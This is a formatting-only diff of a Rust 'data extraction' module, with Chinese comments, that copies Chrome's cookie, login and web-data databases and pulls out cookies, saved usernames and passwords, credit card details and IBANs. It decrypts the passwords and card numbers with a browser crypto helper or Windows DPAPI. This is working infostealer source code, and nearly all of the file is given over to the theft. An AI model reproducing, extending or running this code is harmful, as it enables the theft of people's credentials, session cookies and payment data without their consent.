@@ -1,10 +1,10 @@
 // 数据提取模块 - 从浏览器数据库中提取敏感信息
 
-use anyhow::{Result, Context};
-use rusqlite::Connection;
-use serde::{Serialize, Deserialize};
-use std::path::Path;
 use crate::decryption::crypto::BrowserCrypto;
+use anyhow::{Context, Result};
+use rusqlite::Connection;
+use serde::{Deserialize, Serialize};
+use std::path::Path;
 
 /// Cookie 数据结构
 #[derive(Debug, Serialize, Deserialize, Clone)]
@@ -63,8 +63,7 @@ impl ExtractionResult {
 
     /// 转换为 JSON 字符串
     pub fn to_json(&self) -> Result<String> {
-        serde_json::to_string_pretty(self)
-            .context("Failed to serialize extraction result to JSON")
+        serde_json::to_string_pretty(self).context("Failed to serialize extraction result to JSON")
     }
 }
 
@@ -117,28 +116,30 @@ impl DataExtractor {
 
         // 复制数据库以避免锁定
         let temp_path = std::env::temp_dir().join("chrome_cookies_temp.db");
-        std::fs::copy(&cookies_path, &temp_path)
-            .context("Failed to copy Cookies database")?;
+        std::fs::copy(&cookies_path, &temp_path).context("Failed to copy Cookies database")?;
 
-        let conn = Connection::open(&temp_path)
-            .context("Failed to open Cookies database")?;
+        let conn = Connection::open(&temp_path).context("Failed to open Cookies database")?;
 
         let mut cookies = Vec::new();
-        let mut stmt = conn.prepare(
-            "SELECT name, value, host_key, path, secure, httponly, expires_utc FROM cookies"
-        ).context("Failed to prepare SQL statement")?;
+        let mut stmt = conn
+            .prepare(
+                "SELECT name, value, host_key, path, secure, httponly, expires_utc FROM cookies",
+            )
+            .context("Failed to prepare SQL statement")?;
 
-        let cookie_iter = stmt.query_map([], |row| {
-            Ok(Cookie {
-                name: row.get(0)?,
-                value: row.get(1)?,
-                host_key: row.get(2)?,
-                path: row.get(3)?,
-                secure: row.get(4)?,
-                httponly: row.get(5)?,
-                expires_utc: row.get(6)?,
+        let cookie_iter = stmt
+            .query_map([], |row| {
+                Ok(Cookie {
+                    name: row.get(0)?,
+                    value: row.get(1)?,
+                    host_key: row.get(2)?,
+                    path: row.get(3)?,
+                    secure: row.get(4)?,
+                    httponly: row.get(5)?,
+                    expires_utc: row.get(6)?,
+                })
             })
-        }).context("Failed to query cookies")?;
+            .context("Failed to query cookies")?;
 
         for cookie in cookie_iter {
             if let Ok(c) = cookie {
@@ -163,27 +164,28 @@ impl DataExtractor {
         std::fs::copy(&login_data_path, &temp_path)
             .context("Failed to copy Login Data database")?;
 
-        let conn = Connection::open(&temp_path)
-            .context("Failed to open Login Data database")?;
+        let conn = Connection::open(&temp_path).context("Failed to open Login Data database")?;
 
         let mut login_data = Vec::new();
         let mut stmt = conn.prepare(
             "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
         ).context("Failed to prepare SQL statement")?;
 
-        let login_iter = stmt.query_map([], |row| {
-            let encrypted_password: Vec<u8> = row.get(2)?;
-            let decrypted_password = match self.decrypt_password(&encrypted_password) {
-                Ok(pwd) => pwd,
-                Err(_) => String::from("[DECRYPTION_FAILED]"),
-            };
+        let login_iter = stmt
+            .query_map([], |row| {
+                let encrypted_password: Vec<u8> = row.get(2)?;
+                let decrypted_password = match self.decrypt_password(&encrypted_password) {
+                    Ok(pwd) => pwd,
+                    Err(_) => String::from("[DECRYPTION_FAILED]"),
+                };
 
-            Ok(LoginData {
-                origin_url: row.get(0)?,
-                username_value: row.get(1)?,
-                password_value: decrypted_password,
+                Ok(LoginData {
+                    origin_url: row.get(0)?,
+                    username_value: row.get(1)?,
+                    password_value: decrypted_password,
+                })
             })
-        }).context("Failed to query logins")?;
+            .context("Failed to query logins")?;
 
         for login in login_iter {
             if let Ok(l) = login {
@@ -205,31 +207,31 @@ impl DataExtractor {
 
         // 复制数据库
         let temp_path = std::env::temp_dir().join("chrome_web_data_temp.db");
-        std::fs::copy(&web_data_path, &temp_path)
-            .context("Failed to copy Web Data database")?;
+        std::fs::copy(&web_data_path, &temp_path).context("Failed to copy Web Data database")?;
 
-        let conn = Connection::open(&temp_path)
-            .context("Failed to open Web Data database")?;
+        let conn = Connection::open(&temp_path).context("Failed to open Web Data database")?;
 
         let mut payment_data = Vec::new();
         let mut stmt = conn.prepare(
             "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards WHERE use_count >= 0"
         ).context("Failed to prepare SQL statement")?;
 
-        let payment_iter = stmt.query_map([], |row| {
-            let encrypted_card: Vec<u8> = row.get(1)?;
-            let decrypted_card = match self.decrypt_password(&encrypted_card) {
-                Ok(card) => card,
-                Err(_) => String::from("[DECRYPTION_FAILED]"),
-            };
+        let payment_iter = stmt
+            .query_map([], |row| {
+                let encrypted_card: Vec<u8> = row.get(1)?;
+                let decrypted_card = match self.decrypt_password(&encrypted_card) {
+                    Ok(card) => card,
+                    Err(_) => String::from("[DECRYPTION_FAILED]"),
+                };
 
-            Ok(PaymentData {
-                name: row.get(0)?,
-                card_number: decrypted_card,
-                expiration_month: row.get(2)?,
-                expiration_year: row.get(3)?,
+                Ok(PaymentData {
+                    name: row.get(0)?,
+                    card_number: decrypted_card,
+                    expiration_month: row.get(2)?,
+                    expiration_year: row.get(3)?,
+                })
             })
-        }).context("Failed to query credit cards")?;
+            .context("Failed to query credit cards")?;
 
         for payment in payment_iter {
             if let Ok(p) = payment {
@@ -250,32 +252,34 @@ impl DataExtractor {
         }
 
         let temp_path = std::env::temp_dir().join("chrome_iban_data_temp.db");
-        std::fs::copy(&web_data_path, &temp_path)
-            .context("Failed to copy Web Data database")?;
+        std::fs::copy(&web_data_path, &temp_path).context("Failed to copy Web Data database")?;
 
-        let conn = Connection::open(&temp_path)
-            .context("Failed to open Web Data database")?;
+        let conn = Connection::open(&temp_path).context("Failed to open Web Data database")?;
 
         let mut iban_data = Vec::new();
 
         // 检查表是否存在
-        let table_exists: bool = conn.query_row(
-            "SELECT name FROM sqlite_master WHERE type='table' AND name='ibans'",
-            [],
-            |_| Ok(true)
-        ).unwrap_or(false);
+        let table_exists: bool = conn
+            .query_row(
+                "SELECT name FROM sqlite_master WHERE type='table' AND name='ibans'",
+                [],
+                |_| Ok(true),
+            )
+            .unwrap_or(false);
 
         if table_exists {
-            let mut stmt = conn.prepare(
-                "SELECT nickname, value FROM ibans"
-            ).context("Failed to prepare SQL statement")?;
+            let mut stmt = conn
+                .prepare("SELECT nickname, value FROM ibans")
+                .context("Failed to prepare SQL statement")?;
 
-            let iban_iter = stmt.query_map([], |row| {
-                Ok(IbanData {
-                    owner_name: row.get(0)?,
-                    iban: row.get(1)?,
+            let iban_iter = stmt
+                .query_map([], |row| {
+                    Ok(IbanData {
+                        owner_name: row.get(0)?,
+                        iban: row.get(1)?,
+                    })
                 })
-            }).context("Failed to query IBANs")?;
+                .context("Failed to query IBANs")?;
 
             for iban in iban_iter {
                 if let Ok(i) = iban {
@@ -297,8 +301,7 @@ impl DataExtractor {
             return self.decrypt_dpapi_password(encrypted);
         };
 
-        String::from_utf8(decrypted)
-            .context("Failed to convert decrypted password to UTF-8")
+        String::from_utf8(decrypted).context("Failed to convert decrypted password to UTF-8")
     }
 
     /// 使用 DPAPI 解密密码（较旧的 Chrome 版本）
@@ -316,17 +319,10 @@ impl DataExtractor {
         };
 
         unsafe {
-            CryptUnprotectData(
-                &mut data_blob,
-                None,
-                None,
-                None,
-                None,
-                0,
-                &mut output_blob,
-            )?;
+            CryptUnprotectData(&mut data_blob, None, None, None, None, 0, &mut output_blob)?;
 
-            let decrypted = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
+            let decrypted =
+                std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
             let result = String::from_utf8(decrypted.to_vec())?;
 
             // 清理 (LocalFree 在此环境不可用，内存由Windows自动管理)
